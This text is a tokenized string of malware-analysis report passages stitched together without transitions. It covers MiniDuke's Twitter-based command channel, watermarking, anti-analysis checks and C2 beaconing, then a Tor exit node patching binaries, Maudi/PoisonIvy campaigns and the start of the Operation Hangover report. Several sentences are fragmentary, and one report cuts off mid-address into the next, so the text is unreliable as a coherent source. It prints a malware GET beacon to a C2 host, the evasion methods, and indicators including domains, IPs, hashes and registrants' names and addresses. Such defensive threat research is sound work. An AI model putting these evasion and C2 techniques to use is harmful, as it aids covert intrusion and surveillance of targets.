Until now , we have only found spreading mechanisms that use social engineering via malicious PDF files sent over e - mail ( see Appendix F : Forged documents↓ ) .
The ( Appendix D : E - Mail samples used in attacks↓ ) section shows such a sample isolated from a real - life attack .
The following exploits have been used to trigger the infection : 2012 CVE-2011 - 2462 2013 CVE-2013 - 0640 The infection vector for the samples dated 2011 is unknown .
The list of known samples is available in the Samples by Year Appendix ↓ .
The file contains four or five sections with standard names such as : .text
The packer code is relatively small ( < 1024 bytes ) .
It is encrypted and located in the .text
The packer is used to decrypt the main code located in the largest section - usually .data
The DLL file only exports one function with a random name .
Decryption SHA1 : SHA1 ( probably modified ) area1 : a 16-byte zone in the malicious file which holds the query string for Google .
This is the case when the malware is started by the dropper .
The malware awaits for the user to interact with the computer and verifies the input from mouse or keyboard in an endless loop .
In the first step , the watermark is applied , as described in the Watermark ↓ section .
After the watermark is applied , the malware re - computes the file 's checksum by using the CheckSumMappedFile ( ) function .
The file is dropped with a name randomly chosen from a list in the % ALLUSERSPROFILE % \ Application Data folder set to automatically start after reboot as described below :  for samples in 2011/2012 : the malware modifies the Shell key in Software\Microsoft\Windows NT\CurrentVersion\Winlogon .
The key holds an environment variable which is set to `` rundll32.exe < path_to_dll > , < export_name > '' .
If there is already a variant of the malware installed before the copy process , the new malware deletes it and creates another combination of names , as well as a new environment variable or .lnk
In this stage , the malicious binary checks if the image is rundll32 - and therefore if it is run on the system through the .lnk
Then , a thread is created in which the OpenInputDesktop ( ) function is called in an endless loop with a sleep interval of 5 seconds .
The malware then waits for user interaction by checking input from the mouse or keyboard .
The binary also checks the current date , but only uses the current week of the month , the current month and year .
The sample from 2011 checks for the current date using http : //tycho.usno.navy.mil / cgi- bin / timer.pl The sample from 2012 checks for the current date using http : //www.time- server.org/gettime.php ? country = China The samples compiled in 2013 get the current date from the operating system .
The malware then removes the watermark , decrypts the data section and attempts to access the Twitter and Google accounts .
When either of the sites respond , it interprets the received data and decodes the tweets .
When the tweet is decoded , the malware connects to the command and control server in the message and send information about the infected system .
The malware then awaits for a response from the command and control center , which comes as an encrypted GIF file .
Upon decryption , the malware extracts the embedded payload and runs it .
The payload is often an update .
After the task has completed , the malware stops .
Its execution only lasts until it manages to connect to a Twitter account , then it exits , in order to increase its chances of staying undetected .
However , it still runs for a little while upon every operating system boot .
The analysis we carried inside the lab reveals that the payloads are not persistent on disk .
We presume that they are downloaded from a specific location whenever the system boots up .
When the malware is ran via rundll32.exe upon the first boot , it creates a copy of itself named as tempfile.dat ( in some samples ) and would mark the executable file in order to prevent it from correctly running on other systems .
This watermarking process involves the modification of two already encrypted data areas at the end of the executable file .
The first encrypted area is 0x80 bytes large and holds the encrypted Twitter link .
For samples dated 2011 , this area starts with encrypted ( http : //twitter.com/ < username > ) For samples dated 2012 - 2013 , the area starts with encrypted ( https : //mobile.twitter.com/ < username > ) The switch to mobile.twitter has been done on purpose in order to keep the data traffic to a minimum when a connection with Twitter is made .
Also worth mentioning is the fact that the variants we discovered as dated 2012/2013 are connecting via HTTPS .
The second area is 0x10 bytes long and holds an encrypted string that is used to perform a Google query for samples from 2012/2013 .
Depending on the string and the current date , a second Twitter handle is generated .
The sample dated 2011 does not feature this Google search mechanism .
The data areas do n't start at a specific offset .
In order to find them , the malware iterates them from their end and looks for the first byte that is not zero .
This would be the last byte from the small area ( which is 0x10 bytes large ) .
From here on , it can compute where the larger data area is located in the file .
After the malware has identified the area offsets , it would start encrypting them .
A hash is also computed on specific pieces of system information and will be used in the encryption process .
The malware enumerates every network interface , isolates the first DWORD in the description and writes it to the buffer .
The result is overwritten to the previously collected data .
This behavior is probably triggered by a bug .
The data is padded with zeros in order to achieve a block of 0x40 bytes .
A SHA-1 hash is then computed on these bytes , which is then used to modify the small data area ( area1 ) .
For the large data area ( which is 0x80 bytes long ) , the malware does not use the same hash for encryption .
Instead , it would interchange the first DWORD with the second one in the structure and would re - compute the SHA-1 hash .
After these operations have completed , a new checksum on the file is computed via the CheckSumMappedFile ( ) function .
When the malware is run automatically ( through rundll.exe ) , the watermark is removed .
The malware re - computes the hash based on the information collected from the system and would perform a XOR operation with the keys computed on the data sections as described in the Watermark ↑ section .
When these operations have completed , the sample loaded in memory would not feature the watermark and the data can be decrypted .
In order to deter analysis and avoid identification in automated malware research systems , the malware iterates through processes and looks for potentially dangerous processes listed in the Appendix A : Process Blacklist ↓ section .
If it finds a blacklisted process , the malware modifies the first DWORD in the structure to be hashed in order to ensure that the data can not be correctly decrypted .
As we discussed in the previous paragraphs , we know that the full Twitter link used by this specific sample is located in the second data section .
Upon decryption , the buffer should start with http ( s ) : // ( mobile|m ) twitter.com which means that we could find out the encryption key used for watermarking , as the encryption algorithm is a constant , just like the encrypted data .
We can find all the 16 bytes , since the plain - text is over 16 bytes long .
As soon as we had the key , we could completely decrypt the full link , including the Twitter username .
For the first data section - where the Google hyperlink is stored - cryptanalysis can not be performed as we do n't have a prefix of the encrypted text .
More than that , the length of the encrypted data is exactly the same as the length of the key .
The process starts with removing the watermark , as described in the Removing the Watermark ↑ section .
At this point , we can isolate the data , although it is encrypted .
We proceed then with decrypting the 16-byte section that holds the Google username .
The decryption key is obtained by computing the CRC on the unpacked code .
The code starts at offset 0xC and spans until the beginning of the data section ( which is 0x80 bytes long ) .
Going further , the large area is decrypted with the following algorithm : The result holds the Twitter link with the username .
If the primary Twitter username ca n't be accessed or if there is an error while contacting the C & C server mentioned in the first tweet , the malware will attempt the same operation with the secondary Twitter account .
This secondary account is derived from the Google ID ( which is hardcoded into the sample ) and the current date ( current week ) .
This means that a different ID should come up every week .
The malware gets the current date , but only keeps the week of the month , month and year .
These pieces of data are then concatenated with the decrypted data in the first data section .
A SHA-1 hash is computed on a buffer that has the following structure : Date|GoogleSearchTerm .
The hash is then converted to Base64 and isolates the first N bytes of the buffer , which are determined by : Special characters are then stripped from the resulting string .
Character ' + ' becomes ' a ' , and character ' / ' becomes ' 9 ' .
The malware variant dated 2011 connects to twitter.com , while the variants isolated in 2012/2013 use mobile.twitter.com instead .
Every sample comes hardcoded with a version number in the form of a string .
Every version uses a different Twitter username .
These are the Twitter accounts extracted from samples throughout the years : 2011 ObamaApril Etoursinfo 2012 RuthHarper14 CurtinDiana trulrich zokath 2013 KellyPalmer20 EdithAlbert1 FontenotHoward JennieCartagena LorindaRay1 TinaPena10 The tweets are encoded in the following form : uri ! wp07VkkxYt3Ag / bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA== After decryption , the tweets would become URLs to update servers .
The buffers are decoded using Base64 , then rotates the output to the right ( ROR ) with a variable number of bytes , and then 0x5A is subtracted .
The encoding is fairly easy by reversing the algorithm .
If there are connectivity issues while accessing Twitter or if no tweets holding a uri ! command are found , the malware falls back to an alternate backup mechanism .
A search query with a series of characters is sent to Google .
The results are then processed until an `` uri ! '' pattern is found .
A Google search for these sequences did not yield any results .
Most likely , the mechanism has been implemented either for possible victims who had access to Twitter blocked in the firewall or as a failsafe mechanism , should the Twitter accounts get suspended .
Also worth mentioning is the fact that the publication of any technical papers about MiniDuke with mentions to the uri ! command and these unique sequences would also activate this mechanism .
If an infected system is unable to connect to Twitter anymore , it would still be able to call back home , as the Google query would return the C & C address in these technical papers .
Each Twitter username is associated with as many command and control centers as tweets .
The tweets are encoded as described in the Decoding the Tweets ↑ section .
After the C & C address is decoded , the malware concatenates it with index.php or main.htm , default.htm , home.htm etc .
See the Appendix B : Possible channels used for C & C section ↓ .
The Twitter accounts and their corresponding messages are listed in the Appendix E : Twitter accounts section↓ , along with their timestamp - the date in which action was taken by the attacking party .
The language of these tweets is particular for non - native English speakers - indefinite articles are missing , but the definite ones are present .
This is a feature particular to a small number of relatively popular languages that are spoken in Indonesia or Middle East .
He is working hard .
Sunny ! uri ! wp07VkkxYt3Mne5uiDkz4Il / Iw48Ge / EWg== The malware performs a GET request to a server with a Base64-encoded string that , if decoded , reads the following : For 2011 samples : crc32 country_code ComputerName/ % USERDOMAIN % OS major , minor , sp_major , prod_type , architecture ( 32/64bit ) antivirus_list proxy_list version ( the version of the malicious sample ) All values are split with `` | '' .
The entire string is encoded in Base64 .
For 2012/2013 samples : These samples send additional data , such as the system username .
Another significant change is the fact that the malware encodes the text using XOR and a key that results from SHA-1 hashing of the Google identifier .
The resulting buffer is then encoded with Base64 .
This is a practical example of the GET request : ? a = MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy & g = MjIzMTQy M. The variables names in the GET requests are randomly - picked .
The second variable holds a CRC modulo 13D455h on the encoded string .
The server responds with a GIF file that holds either a DLL or an EXE file .
After a request is sent to the C2 , the malware receives a file with a .GIF
This is usually a valid image that has appended to it a payload or an update in an encrypted form .
The malware checks for the ' GIF8 ' magic at the beginning of the file and looks for the 0x3b00 word .
If the pattern is found , the malware isolates the next four bytes that actually represent the decryption key , followed by the encrypted payload .
Next , the digital signature is verified and then the payload is decrypted .
If it is a DLL file , it attempts to load it via LoadLibrary ( ) ; if it is an EXE file , it gets written on disk with one of the following names : winupdt.exe , wcsntfy.exe , netmngr.exe , dumpreport.exe , taskhosts.exe , wupdmngr.exe , winhlp.exe , dllhosts.exe , dxdiagupd.exe , dialers.exe , netschd.exe , connwiz.exe , certupdt.exe , repfault.exe , wuapreport.exe , lanmgr.exe .
The file is then executed .
The GIF file is digitally signed with RSA 2048bit .
The signature is located at the end of the GIF file and uses SHA-1 .
This mechanism ensures that the updates are `` legit '' and prevents an outsider from pushing a fake update .
The encryption algorithm for these GIF files is a simple XOR operation with a key that rotates on each step The C & C located at http : //hottraveljobs.com / forum / docs / info.php holds a list that resembles log files .
There are approximately 60 entries which we believe are information about the targets .
Since we know the form of the data sent over to Command and Control centers , we might be able to get the format for the logs .
The format is < CRC > |base64| < size > | < md5 > .
The CRC is a decimal representation , while the < size > field can represent the size of a payload sent to the respective target .
The < md5 > - value may be the MD5 hash of the payload .
Example 25479421 84| 4mBwdmBzEaXtEGJSE10Z4mgVEuNV4mBXECt7 gwtgf7EgGBbaHbAs7B7G7Bt0FnlFk17Z 4hTuk1bZ4Ct EiHEU9wEsIoFLgW7mjh3pjCNLfhEuIHzViHbRJwTrk1cS4G3Z4mFS4GAS4mAt4hTtE1PueGPVeF== |0 |0 24194643 63| EucSE6XtEGASE10Z4mFteGFWE14W4wt7gwt1GVzG7gTrgB4sF Vxegv74 d7 01k1IZ4hTtk1bZ4htbgV7 gcBz5f14 UcBbSj2nWih3vJUA Vdm3ZdhTUdmB Uk1cVdmBT dmcT4GbZ4GBY4mcY4mN= |150948 |c026fbffeed6155b f1 86abedb8681257 If the two fields at the end are really representations for < size > and md5 , then we may have 24 different binary files ( see the Appendix C : Possible MD5 hashes for payloads section ↓ ) .
No files in the list could be found by their corresponding MD5 .
Each sample of the malware comes with a version number hardcoded in the binary .
Different versions are usually linked to a different Twitter account .
The vast number of versions indicates intense activity , but only a limited number of samples are known .
The timestamp is isolated from the sample 's PE header and represents the moment in which the executable file has been linked .
Although it can be usually spoofed , we believe it is real , as we were able to correlate it with the moment we received each of the samples .
The one linked with the ObamaApril Twitter handle - malware version 0.1 - appears to be the oldest sample .
The jump to version 2.12 can not be justified , and we believe that there are a number of missing samples , which makes year 2011 one of the most active periods for this family of malware .
However , one could also speculate that the versions do not follow a strict order .
For instance , version 3.13 was released in December , while version 5.21 was spotted in May .
It is possible that the servers hosting the samples to have run out of sync .
This would explain why lower versions have shown up in December .
Every subversion of the malware comes with a separate Twitter handle .
Quick math shows that there are at least 20 Twitter accounts that have been used in the attacks throughout 2013 ( or at least until February 26th , the date of the discovery ) .
The first defense mechanism to prevent analysis is the presence of the watermark .
The binary file wo n't properly run on a different machine , since the data inside the malware would be decrypted improperly .
Other techniques to prevent data decryption are present inside the binary :  Running software used for reverse engineering : OllyDbg , IDA , Process Monitor etc .
The malware also monitors for signs of user interaction , a common technique used for anti- emulation and anti - automated malware analysis .
Another important aspect for versions in 2012 and 2013 is the fact that the malware does not trigger right after installation , but rather wait for a system restart to execute its main code .
These are the MD5 hashes for the droppers .
The date is collected from the PE file header of the backdoor in the droppers : 1e1b0d16a16cf5c7f3a7c053ce78f515 , 2012 - 03 - 05 b029378966d2694f8abd51f0d6c7822a , 2012 - 06 - 15 53db085a276ebbf5798ba756cac833ea , 2013 - 02 - 22 The loader decodes the information in the .data
This piece of code holds a small loader stub , followed by an executable file which is the backdoor itself .
The stub overwrites the memory image of the original executable file with the backdoor so it is never written on disk .
The malware also creates the following key in the Registry HKCU\Software\Microsoft\ApplicationManager with a value of AppID = < random > ( the value is generated via the GetTickCount ( ) function ) .
Malware then waits in a loop and performs requests to info.leveldelta.com Example : GET /php / text.php ? i = gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept : * / * User - Agent : Mozilla/4.0 Host : info.leveldelta.com The base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount ( ) and is always different .
We believe that it is used as an identifier .
If it gets a response from the server , the malware performs a series of validations and execute the received commands .
The responses are sent via POST and contain the identifier from the GET request , followed by the command 's result .
This is the way the malware exfiltrates documents from the target computers .
Uses MoveFileA api .
Uses CopyFileA api .
Uses DeleteFileA api .
Uses GetCurrentDirectoryA api .
Uses SetCurrentDirectoryA api .
Uses RemoveDirectoryA api .
Uses CreateDirectoryA api .
Uses OpenProcess , TerminateProcess apis .
Uses CreateProcessA api .
Uses GetTempPathA , SetCurrentDirectoryA APIs .
The following strings are used for their types : unk , nrt , rmv , fix , net , cdr , ram , und .
Uses GetLogicalDriveStringsA , GetDriveTypeA apis .
Uses GetTickCount api .
String generated like : `` % d % s\n % s\ % s\ '' using GetCurrentProcessId , GetModuleFileNameA , GetComputerNameA , GetUserNameA apis .
Uses FindFirstFile ( `` * '' ) , FindNextFile apis .
Uses CreateFileA , WriteFile apis .
Uses EnumProcesses , OpenProcess , EnumProcessModules , GetModuleFileNameExA apis .
We have identified two servers used in the attack ( sample md5/timestamp / server ) : 1e1b0d16a16cf5c7f3a7c053ce78f515 , 2012 - 03 - 05 news.grouptumbler.com/news/feed.php b029378966d2694f8abd51f0d6c7822a , 2012 - 06 - 15 info.leveldelta.com/php/text.php 53db085a276ebbf5798ba756cac833ea , 2013 - 02 - 22 info.leveldelta.com/php/text.php Whois information on news.grouptumbler.com Registrant Contact : Grouptumbler . COM Tim K. Lappin ( ) Fax : 4573 Froe Street Bluefield , WV 24701 Bluefield , WV 24701 US 4573 Froe Street Bluefield , WV 24701 Bluefield , WV 24701 Whois information on info.leveldelta.com Registrant Contact : Abdul Kasim ( ) Fax : 1442 Sokak No 49 Izmir , IZMIR 35432 TR 1442 Sokak No 49 Izmir , IZMIR 35432 TR 626489f8cafacb1b24fe6ecf0db52f23 - The received.gif file , named 3979106736.gif 6bc34809e44c40b61dd29e0a387ee682 - The variant decrypted from the .gif
The file does not have version information or digital signature .
The malware checks to see if the host computer connects to the Internet through a proxy server .
If set , the malware uses the proxy settings .
Regardless of the connection method , the malware connects to 85.95.236.114:443 using sockets .
It creates an unique identifier ( DWORD size ) , from the socket handle .
Everything is encrypted with XOR and a value of an address on the stack .
It sends the identifier on the opened socket .
It receives 16 bytes from the socket , and creates a MD5 hash on these .
The MD5 hash will be used as key for the AES algorithm .
It receives 16 bytes used for AES encryption as initialization vector .
It receives 4 bytes , it performs a XOR operation with the identifier and allocates memory as follows : malloc ( val XOR user_id ) It receives a number of size bytes , decrypts them with AES and calls the start of the decrypted buffer .
The payload can be used to load new modules .
The received code needs to be completely relocatable as the main piece of malware .
Using this technique , the attackers may introduce malicious code that will never be saved on disk , but rather executed directly from memory .
We could also presume that some payloads have been exclusively delivered via this channel and ca n't be recovered for forensic investigation because they never made it on the disk drive .
Information about 85.95.236.114 Location : Turkey Izmir Inetmar Internet Hizmetleri San .
Tic .
Ltd. Sti ASN : AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System ( izmir ) ( registered Jun 15 , 2009 ) Contact : person : Deniz Tosun org : ORG - IiHS1-RIPE address : 1370 sok .
After creating and using a new exitmap module , I found downloaded binaries being patched through a Tor exit node in Russia .
Tor is a wonderful tool for protecting the identity of journalists , their sources , and even regular users around the world ; however , anonymity does not guarantee security .
At DerbyCon this year I gave a presentation of my binary patching framework , BDF .
Many binaries are hosted without any transport layer security encryption .
Some binaries are signed to prevent modification , but most are not .
During that presentation , I talked about the MITM patching of binaries during download , and showed how easy it was using BDFProxy .
I also mentioned that similar techniques are probably already in use on the Internet .
I had only circumstantial evidence until recently .
I tested BDFProxy against a number of binaries and update processes , including Microsoft Windows Automatic updates .
The good news is that if an entity is actively patching Windows PE files for Windows Update , the update verification process detects it , and you will receive error code 0×80200053 .
This error code indicates a failed signature verification for the downloaded binary .
Windows Update produces this error code for three root causes : 1 .
The file was truncated during download .
Very possible .
The file was patched during download .
Improbable .
Very improbable .
If you Google the error code , the official Microsoft response is troublesome .
The first link will bring you to the official Microsoft Answers website .
Notice that this question has been viewed over 34,000 times .
If you follow the three steps from the official MS answer , two of those steps result in downloading and executing a MS ' Fixit ' solution executable .
If an adversary is currently patching binaries as you download them , these ' Fixit ' executables will also be patched .
Since the user , not the automatic update process , is initiating these downloads , these files are not automatically verified before execution as with Windows Update .
In addition , these files need administrative privileges to execute , and they will execute the payload that was patched into the binary during download with those elevated privileges .
Note : a Windows Home or Enterprise user could configure AppLocker to only run signed binaries .
It issues the following error when the self - checking fails : Looking at Google Trends , this error message is quite common : Notice the top countries where this search is originating : A user can receive an error code for any of the following three root causes : 1 .
The binary was patched .
Improbable .
The binary was truncated due to a poor Internet connection .
Very probable .
An actual error with the install program .
Very improbable .
This combined circumstantial evidence left me wondering if there is an individual or group actively patching binaries on the greater Internet .
To have the best chance of catching modified binaries in transit over the Internet , I needed as many exit points in as many countries as possible .
Using Tor would give me this access , and thus the greatest chance of finding someone conducting this malicious MITM patching activity .
After researching the available tools , I settled on exitmap .
Exitmap is Python - based and allows one to write modules to check exit nodes for various modifications of traffic .
Exitmap is the result of a research project called Spoiled Onions that was completed by both the PriSec group at Karlstad University and SBA Research in Austria .
I wrote a module for exitmap , named patchingCheck.py , and have submitted a pull request to the official GitHub repository .
See the usage example .
Soon after building my module , I let exitmap run .
It did not take long , about an hour , to catch my first malicious exit node .
Details from https : //check.torproject.org / exit - addresses ExitNode 8361A794DFA231D863E109FC9EEEF21F4CF09DDD Published 2014 - 10 - 22 01:06:40 LastStatus 2014 - 10 - 22 02:02:33 ExitAddress 78.24.222.229 2014 - 10 - 22 02:08:01 This exit node was very active .
Upon further inspection , the original binary is wrapped within another binary similar to the technique mentioned in the research from Flex Grobert , et al , titled `` Software Distribution Malware Infection Vector '' ( 2008 ) .
However , these malware authors solved the icon issue noted in the paper by keeping the .rsrc
By using a wrapper for the original binary , the malware authors do not invoke the NSIS error and bypass simple self - checking mechanisms .
Out of over 1110 exit nodes on the Tor network , this is the only node that I found patching binaries , although this node attempts to patch just about all the binaries that I tested .
The node only patched uncompressed PE files .
This does not mean that other nodes on the Tor network are not patching binaries ; I may not have caught them , or they may be waiting to patch only a small set of binaries .
Leviathan has notified the Tor Project of the issue .
Companies and developers need to make the conscious decision to host binaries via SSL / TLS , whether or not the binaries are signed .
All people , but especially those in countries hostile to `` Internet freedom , '' as well as those using Tor anywhere , should be wary of downloading binaries hosted in the clear - and all users should have a way of checking hashes and signatures out of band prior to executing the binary .
Maudi is a series of small malwares that share similar configuration and behaviour .
The naming of this family has not been very established , but some samples are detected by some vendors as Maudi or PoisonIvy .
This is partly accurate as Maudi trojans in almost all cases install the well known PoisonIvy remote access trojan .
These malwares are not particularly new - they have been in circulation for a long time , probably going back to at least 2009 .
Still , they provide a backdrop to other attacks that is interesting .
The malware itself is not very complex .
These are small installers that create two files – one library ( typically called msacm32.drv , ntshrui.dll or wdmaud.drv ) in the Windows folder , and a raw PoisonIvy shellcode blob called user.dat , user.db , temp.db or something along those lines .
The installer then spawns explorer.exe , which then automatically loads the malicious library through a mechanism called DLL hijacking aka DLL preloading .
There are innocent libraries with the same names in the Windows System folder , but since the malicious libraries are placed in the Windows folder , they sneak in the queue and Explorer loads them first .
The malicious library then reads and directly calls the PoisonIvy code in user.dat , which establishes an encrypted communication with the configured C & C server .
When communication is established , the attacker has unauthorized access to the computer .
The Maudi PoisonIvy droppers contain their own small xor - encoded configuration block which overrides the default settings stored in the PoisonIvy blob .
This usually contains the name of the C & C server , port and what corresponds to the PoisonIvy profile ID .
Example Maudi configuration : Profile ID : xfish C & C : 171088046.gnway.org port : 0x0D84 = 3460 The ID xfish is used in many of these malwares and may be a default value , but there are many others in use .
The password for this communication is usually hardcoded in the malware itself ; the default value used by the builder is `` admin '' .
The passwords used by Maudi droppers vary .
Sometimes the default value is used , other times the password is set to longer strings .
There seems to be an affinity for passwords of length 11 ( 0x0b ) .
A few are shown below .
The interesting bit with these trojans is that practically all of them are digitally signed using self - made test certficates .
These certificates vary somewhat , but most contain the recognizable string `` WWW.CeleWare . NET '' or '' WWW.AeleWare . NET '' in their Organizational Unit ( OU ) section .
The CeleWare strings are default values left by the free code signing tool CeleSign.exe from Yonsm . NET .
Though the tool itself seems innocent enough , many files signed by it are malicious .
There were a number of different such certificates , and it may be that the varying certificates denote different campaigns , projects or other contexts – for example , all samples we have seen signed `` DataBase @ Hotmail.com '' are droppers that install Maudi components signed `` MogolSoft @ Hotmail.com '' or `` SoftSign @ HotMail.com '' .
Though by far most of these malwares use test certificates , not all follow this pattern .
A few are not signed at all , and in two cases we have seen the use of a stolen certificate .
The certificate in question belongs to YNK Japan Inc .
This is the configuration block from one of the YNK - signed Maudi samples .
C & C is p.hannmaill.net , port is 3460 ( 0xD84 ) , and tag is xfish .
These two trojans are configured to connect to p.hannmaill.net and s.hiinet.net , respectively .
These domains appear registered by the same entity ( sofoxman @ gmail.com ) .
Both the domains and the certificate have been connected to targeted attack campaigns before .
By combining certificates and command & control infrastructure we can construct a partial image of this malware operation In this diagram the samples are organized in clusters signed similarly .
What quickly becomes obvious is that most of the samples are connected ; either they use the same certificate , or their certificate cluster is connected with other clusters through common Command & Control servers .
Some clusters ( shown at the lower right and left side ) seem unconnected beyond the fact that they use the same malware .
The Command & Control servers used are in many cases organized through well - known dynamic DNS providers such as 3322.org , zapto.org and so on , but there are also a few seemingly directly registered second level domains .
A full list of these is provided in the appendix .
Local Chinese interests and human rights activists We do not have extensive data on which targets have been exposed to Maudi malware , but we have some examples which give decent hints .
Some Maudi droppers display images , like the ones below : These are classic examples of decoys used in targeted campaigns against activists working for the rights of ethnic minorities within the Chinese borders .
Other decoy documents contain small messages in Chinese ; and Chinese name listings .
This gives the general impression that this family is used mostly against domestic Chinese targets and human rights activists .
Other research has confirmed this impression .
In his 2010 article `` Human Rights and Malware Attacks '' , security researcher Nart Villeneuve documents the use of Maudi as the downloaded payload of spearphishing attacks .
The initial payload in that case was a mail attachment , an exploited PDF file ( readme.pdf , md5 72bdca7dd12ed04b21dfa60c5c2ab6c4 ) which downloaded and decoded an encoded blob ( md5 ec16143a14c091100e7af30de03fce1f ) from the site www.humanright-watch.org , not to be confused with the legitimate Human Rights ' Watch website hrw.org .
The decoded file was a Maudi dropper , self - signed using the name `` soft @ hotmail.com '' , and the dropped component belonged to the `` JinDiQIAO @ hotmail.com '' -signed cluster .
There are hints at other targets as well .
A group of Maudis use domain names and other strings that seem to indicate a focus on a specific region , namely Mongolia .
Mongolia is an interesting country .
It is democratic with a multi - party system , and has a market - driven economy .
It is squeezed between two very powerful nations – Russia to the North and China to the South .
It is also a country rich on geological natural resources .
The initial hints about this targeting are vague .
Some of the Maudi samples are signed using self - signed certificate issued to `` mogolsoft @ hotmail.com '' .
Others use the Command & Control domain `` mol-goverment.com '' .
This domain was registered by a known targeted attack actor , hlemonk @ 163.com , who has registered a string of other malware- connected domains – among others goodmongol.com .
However , when looking more closely , more solid ties to Mongolian targets can be found .
The Maudi domain bodologetee.com ( registered by the email entity mongolianews @ yahoo.com ) can be documented used in other attacks on apparent Mongolian targets .
For example , the malware dropper cc1a806d25982acdb35dd196ab8171bc , a WinRAR SFX executable installed through the use of the Word exploit CVE-2012 - 0158 , contained a PlugX component configured to connect to ppt.bodologetee.com .
This is documented in the Norman Shark blog post `` The Chinese Malware Complexes : PlugX Used against Mongolian Targets '' .
Indirectly , we see that the Maudi infrastructure shares parameters with several well known targeted attack campaigns .
These samples are ( md5 , profile ID ) : 28b5241ca13603636dbf626792231161 , qwerw 6a83dc3f53079e17ecc49cbc0dacc8f5 , qwerw cf45dbdb3718b4b728c2dd894032464b , qwerw The malwares used in the RSA intrusion itself were also PoisonIvy , though used a different dropper mechanism and were signed using a different digital certificate .
This domain was registered by jeno_1980 @ hotmail.com , an email address also used to register domains used both in the Mirage and Sin Digoo malware campaigns .
This address has also registered domains used in Briba ( aka c0d0so0 ) malware , which has been used for many targeted attacks .
Mol - government.com and these other domains have been used as C & C by Sogu / Thoper trojans in attacks on apparent Korean and Mongolian targets , as well as by other malwares like PcClient .
It has also been documented used by PlugX malware in campaigns apparently against Mongolian targets .
The same registration information was used to register yahoomesseges.com , which has been used by EvilGrab malware .
This certificate has been used in several hundred samples spanning various campaigns and incidents .
One of these was the SK intrusion in 2011 , where one of the initial malwares - a Sogu / Thoper trojan - was signed with it .
However , it shares some indicators ( C & C domains , registration information ) with other , more high - profile attacks .
What these connections mean is unclear .
It might be just sharing of information between groups ; we know that there is quite a bit of sharing going on , particularly of malware and source code .
Less is known about how much is shared in terms of infrastructure ( ex .
It is our opinion , however , that the Maudi system hints at something else .
There is for example a large amount of samples that use the same self - signed certificates in addition to overlaps in other indicators .
Self - signed certificates have little value in the underground as they can be freely made ; so there is little reason for sharing these .
Instead the impression is that these malwares have been signed by the same malware creation system .
Another aspect is the architecture where default PoisonIvy shellcode blobs are overridden with configuration information from the dropper .
This also may indicate homegrown build tools , possibly to alleviate language issues with the PoisonIvy builder itself .
There is a possibility that this indicates a large group of attackers , but might also be a part of a Digital Quartermaster function , as recently postulated by FireEye .
This report details a sophisticated cyberattack infrastructure that appears to originate from India , conducted by private threat actors with no evidence of state - sponsorship .
It has likely been in operation for over three years , primarily as a platform for surveillance against targets of national security interest that are mostly based in Pakistan and possibly in the United States .
It is also used for industrial espionage against the Norwegian telecom corporation Telenor and other civil- ian corporations .
Evidence points to professional project management and outsourcing of key tasks , including some by freelance programmers .
On March 17 , 2013 a Norwegian newspaper reported that the country 's telecommunications giant Telenor had filed a criminal police case for an unlawful computer intrusion .
Spear phishing emails targeting upper management appeared to be the source of the infection Through extensive analysis , security analysts at Norman Shark in conjunction with our partners , quickly uncovered a previously unknown and sophisticated infrastructure for targeted attacks .
The primary purpose of this long - running , global command - and - control net- work appears to be surveillance against national security interests .
Private- ··· sector industrial espionage in fields as diverse as natural resources , telecommu- nications , law , food & restaurants , and manufacturing is likely a secondary pur- pose of this network .
Based on analysis of IP addresses collected from criminal data stores discov- ered during the investigation , it appears that potential victims have been target- ed in over a dozen countries , most heavily represented by Pakistan , Iran , and the United States .
Targets include government , military , and civilian organizations Spear phishing to carefully - selected target individuals was the primary attack vector identified in the investigation .
The attackers went to great lengths to make the social engineering aspects of the attack appear as credible and applica- ble as possible .
In many cases , decoy files and websites were used , specifically geared to the particular sensibilities of regional targets including cultural and religious sub- ject matter .
Victims would click on what appeared to be an interesting docu- ment , and begin the long - running infection cycle .
Despite all of the recent media attention on so - called `` zero - day '' exploits en- compassing brand new , never - before - seen attack methods , Operation Hangover appears to have relied exclusively upon well - known , previously identified vul- nerabilities in Java , Word documents , and web browsers .
Favored methods include documents infected with malicious code , along with direction to malicious websites with names deliberately similar to legitimate government , entertainment , security related , and commercial sites .
Often the user would be presented with a legitimate document or software download they were expecting to see , along with an unseen malicious download .
Operation Hangover utilizes a very extensive and sophisticated command - and- control infrastructure , likely developed over many months or years by numer- ous developers .
Our investigation revealed evidence of professional project management practices used to design frameworks , modules , and sub- components .
Individual malware authors were assigned certain tasks , and com- ponents were `` outsourced '' to what appear to be freelance programmers .
In recent months , much focus has been on China – including both state- sponsored and individual actors – but Operation Hangover contains notable hallmarks of originating exclusively in India .
We base this attribution with a very high degree of confidence on our extensive analysis of IP addresses , web- site domain registrations , and text - based identifiers contained within the mali- cious code itself .
All indications point to private syndicates of threat actors following their own motivations , with no direct evidence of state - sponsorship by the Indian government or by any other nation .
In this report we detail a cyberattack infrastructure that appears to be Indian in origin .
This infrastructure has been in operation for at least three years , more likely close to four years .
The purpose of this framework seems predominantly to be a platform for surveillance against targets of national security interest ( such as Pakistan ) , but we will also show how it has been used for industrial espionage against the Norwegian telecom corporation Telenor and other civilian corporations .
None of the information contained in the following report is intended to implicate any individual or entity , or suggest inappropriate activity by any individual or entity mentioned .
On Sunday March 17th 2013 the Norwegian newspaper Aftenposten reported that the telecommunications giant Telenor had filed a case with Norwegian criminal police ( `` KRIPOS '' ) over what was perceived as an unlawful intrusion into their computer network .
The infection was reported to have been conducted via `` spear phishing '' emails sent to people in the upper tiers of management .
Initially , we had no information or visibility into this case .
However , after some time Norwegian CERT ( NorCERT ) shared some data from the event , which included md5 hashes of malicious files and information about which Command and Control servers were used .
However , the data we were given acted as a starting point for more data mining , and within a short period of time it became obvious that we were seeing a previously unknown and very extensive infrastructure for targeted attacks .
This paper is the result of the ensuing investigation .
The samples we have uncovered seem to have been created from approximately September 2010 until the present day .
It appears 2012 was a very active year for this group , which saw escalation not only in numbers of created malware files but also in targets .
There is no sign that the attacks will slow down in 2013 , as we see new attacks continuously .
We would also like to thank ESET for graciously sharing information they were in possession of , and finally we would like to express our gratitude to the people who created our database and analysis systems .
These systems enable us to do the data correlation needed to find needles in haystacks , so their creators own a large part of this paper as well .
C & C , C2 , CC : Command- and Control server .
Typically used about the computer the malware connects to in order to report status .
